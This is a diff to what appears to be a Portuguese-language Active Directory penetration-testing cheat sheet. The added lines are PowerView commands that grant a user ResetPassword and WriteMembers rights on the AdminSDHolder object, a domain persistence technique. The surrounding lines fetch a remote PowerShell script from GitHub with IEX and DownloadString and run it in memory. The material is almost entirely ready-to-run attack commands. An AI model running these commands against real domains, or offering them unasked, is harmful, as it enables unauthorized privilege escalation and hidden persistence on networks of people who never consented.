@@ -1625,6 +1625,14 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cia
 ```
 Add-ObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL' -PrincipalIdentity pentester -Rights All -Verbose
 ```
+##### ADMIN SDHOLDER - ADICIONAR OUTRAS PERMISSÕES PARA USUARIO (POWERVIEW)
+```
+Add-ObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL' -PrincipalIdentity vegeta -Rights ResetPassword -Verbose
+```
+```
+Add-ObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL' -PrincipalIdentity vegeta -Rights WriteMembers -Verbose
+```
+
 ##### ADMIN SDHOLDER - PROPAGAR AS PERMISSÕES PARA AS CONTAS PROTEGIDAS
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-SDPropagator.ps1")
